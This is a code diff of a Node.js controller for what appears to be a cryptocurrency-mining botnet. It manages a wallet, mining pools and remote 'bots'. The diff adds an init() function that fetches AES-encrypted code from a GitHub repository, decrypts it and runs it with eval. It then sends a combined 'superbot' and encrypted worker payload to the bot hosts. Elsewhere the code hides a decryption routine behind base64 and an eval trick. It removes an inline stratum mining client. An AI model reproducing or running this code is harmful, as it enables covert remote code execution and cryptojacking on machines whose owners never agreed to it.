@@ -16,20 +16,19 @@ app.listen(process.env.PORT||5000, () => {
 })
 
 var db = {
-  state: 'red', wallet: '*',
-  summary: [ ['Tube'], [require('./package.json').host], ['0 h/s'], ['0/0/0/0'], ['0/0/0/0'] ],
+  state: 'orange', wallet: '*',
+  summary: [ ['*'], [require('./package.json').host], ['0 h/s'], ['0/0/0/0'], ['0/0/0/0'] ],
   pools: { hosts: [], backgrounds: [], hashes: [] },
   bots: { hosts: [], backgrounds: [], hashes: [] },
   log: []
 }
 
 var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') }
-var glob = function(x) { eval(decrypt(x.substring(-~[])))}
-('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY'+
- '3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyh'+
- 'DcnlwdG9KUy5lbmMuVXRmOCkgfQ==')
+var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
+('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfQ==')
 
 var gg = { rec: false };
+
 var pools = [];
 var bots = [];
 var yellow_pools = true;
@@ -65,6 +64,7 @@ setInterval(function() {
       else if(!body.yellow_pools) { log({host:'google',color:'purple',msg:'body is wrong (data)'}); gg.rec = false }
       else {
         db.log = []; var tasks = []; yellow_pools = body.yellow_pools == 'ON';
+        if(body.init) init(body.init);
         if(body.wallet) {
           db.wallet = body.wallet; log({msg:'new wallet: '+db.wallet});
           if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push(pools[i].host); tasks.push(update_pools(list)) }
@@ -85,7 +85,7 @@ function update_pools(list) {
       for(var j=0; j<msgs.length; j++) log({host:msgs[j],msg:'del pool'})
       pools = [];
       for(var j=0; j<list.length; j++) {
-        pools.push(new bittube({ wallet: db.wallet, host: list[j] }));
+        pools.push(new gg.mycoin({ wallet: db.wallet, host: list[j] }));
         log({host:list[j],msg:'add pool'})
       }
       resolve(true)
@@ -146,7 +146,7 @@ function mybot(cmd,bot) {
       request.post({url:bot.host+'/worker',form:{jobs:jobs},json:true },
         function(error, response, body) {
           if(body && body.toString().includes('Cannot POST'))
-            request.post({url:bot.host,form:{worker:worker},json:true},function(error,response,body){botdb(error,body)})
+            request.post({url:bot.host,form:{worker:gg.worker},json:true},function(error,response,body){botdb(error,body)})
           else botdb(error,body,true)
         }
       )
@@ -176,146 +176,31 @@ function mybot(cmd,bot) {
   }
 }
 
-function bittube(req) {
-  var self = this;
-  this.host = req.host;
-  this.state = 'orange';
-  this.hash = '0/0';
-  this.job = null; this.submit = null;
-
-  var wallet = req.wallet
-  var client = new net.Socket();
-  client.on('data', function(data) {
-    data = JSON.parse(data)
-    if(data.result) {
-      if(data.result.status == 'OK') {
-        var t = self.hash.split('/'); 
-        if(Number(t[1]) < Number(t[0])) self.hash = t[0]+'/'+(Number(t[1])+1)
-      }
-      if(data.result.job) myjob(data.result.job)
-    }
-    if(data.method == 'job') myjob(data.params)
-  });
-  client.on('close', function() {
-    self.state = 'red';
-    self.job = null; self.submit = null
-    log({host:self.host, color:'red',msg:'client close'})
-    setTimeout(function() { self.reconnect() }, 60000);
-  });
-  client.on('error', function() {
-    self.state = 'red';
-    self.job = null; self.submit = null
-    log({host:self.host, color:'red',msg:'client error'})
-  });
-
-  this.connect = function() {
-    return new Promise((resolve, reject) => {
-      var addr = self.host.split(':')[0]; var port = Number(self.host.split(':')[1])
-      client.connect(port, addr, function() {
-        var data = { method:"login", params:{login:wallet, pass:"x", rigid:"", agent:"NodeMiner" }, id:1 };
-        client.write(JSON.stringify(data)+String.fromCharCode(10),'ascii');
+function init(coin) {
+  request( require('./package.json').github+"/mylist/master/"+coin+".aes", function(err, res, body) {
+    if(err) console.log('github: '+error.message)
+    else {
+      eval(decrypt(body));
+      request( require('./package.json').github+"/mylist/master/superbot.js", function(err, res, body) {
+        if(err) console.log('github: '+error.message)
+        else {
+          gg.superbot = decrypt(body);
+          gg.worker = gg.superbot+'\n'+decrypt(`
+U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
+GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
+agrwK1Qoaiiw//rGNdNIZA4RBtcHWdbuMrkxGItLMWr8UyiWx7FJ2CSiuSdeTvhT55VcVVYRTO2a2XRJdRytyXHk4mpQtFjIW0dNdq8MeESHSduKfBPZbGiXM1JhxPBFfDvo6VJa3c8umUwGa96uI3bP/J4UzEpl
+DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsHomGOs7zHIXk1c3/0qs6M7bgZ0H6VmEKCIVUr6pm7uFKrz5MVGhIlSbP6IptWyybE9ORC0PFxPvt/Ih3s
+ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
+vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
+59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
+          request( require('./package.json').github+"/mylist/master/"+db.summary[1][0].split('.')[0].split('//')[1]+".aes", function(err, res, body) {
+            if(err) console.log('github: '+error.message)
+            else update_bots(JSON.parse(decrypt(body)))
+          })
+        }
       })
-    })
-  }
-    
-  this.close = function() {
-    return new Promise((resolve, reject) => {
-      if(client.readyState == 'open') client.destroy();
-      resolve(self.host)
-    })
-  }
-
-  this.reconnect = function() {
-    self.close().then( res => self.connect() )
-  }
-
-  this.mysubmit = function(req) {
-    if(yellow_pools) {
-      self.state = 'yellow';
-      self.job = null; 
     }
-    self.submit = {
-      method:"submit",
-      params:{
-        id:req.id,
-        job_id:req.job_id,
-        nonce:req.nonce,
-        result:req.result
-      },
-      id:1
-    }
-    client.write(JSON.stringify(self.submit)+String.fromCharCode(10),'ascii');
-    var t = self.hash.split('/');
-    self.hash = (Number(t[0])+1)+'/'+t[1]
-  }
-
-  function myjob(req) {
-    self.state = 'green';
-    self.job = {
-      id: req.id,
-      version: 1344,
-      throttle: Math.max(0, Math.min(0, 100)),
-      job:{
-        identifier: "job",
-        job_id: req.job_id,
-        algo: "cn-heavy",
-        variant: 2,
-        height: 0,
-        blob: req.blob,
-        target: req.target
-      }
-    }
-    self.submit = null;
-  }
-
-  self.connect().then(
-    res => { console.log(res) },
-    err => { console.log(err) }
-  )
+  })
 }
 
-request( require('./package.json').github+"/mylist/master/"+db.summary[1][0].split(/\/\/|\.|\:/)[2]+".aes", function(err, res, body) {
-  if(err) console.log('github: '+error.message)
-  else eval(decrypt(body))
-  console.log(bots)
-});
-
-request( require('./package.json').github+"/mylist/master/Tube.aes", function(err, res, body) {
-  if(err) console.log('github: '+error.message)
-  else eval(decrypt(body))
-});
-
-var superbot = ''; var worker = '';
-request( require('./package.json').github+"/mylist/master/superbot.js", function(err, res, body) {
-  if(err) console.log('github: '+error.message)
-  else {
-    superbot = decrypt(body)
-    worker = superbot+`
-
-    app.db={state:'yellow',host:h,hash:'0 h/s [0/0]'};
-    var bot = new superbot();
-    var t_hash = l_hash = s_hash = 0;
-    
-    app.post('/worker', app.parser, function (req, res) {
-      app.db.msg = 'nothing';
-      var ps = [];
-      for(var i=0; i<req.body.jobs.length; i++) ps.push(bot.onmessage(req.body.jobs[i]));
-      Promise.all(ps).then(msgs => {
-        t_hash += msgs.length;
-        for(var i=0; i<msgs.length; i++) if(msgs[i] != 'nothing') {
-          if(app.db.msg == 'nothing') app.db.msg = [msgs[i]]
-          else app.db.msg.push(msgs[i]);
-          s_hash++;
-        }
-        res.json(app.db);
-      });
-    });
-    
-    setInterval(function() {
-      app.db.state = t_hash == l_hash ? 'yellow' : 'green';
-      app.db.hash = (t_hash-l_hash)+' h/s ['+t_hash+'/'+s_hash+']';
-      l_hash = t_hash;
-    }, 1000);
-    c(app.db)`;
-  }
-});
+init("Tube")
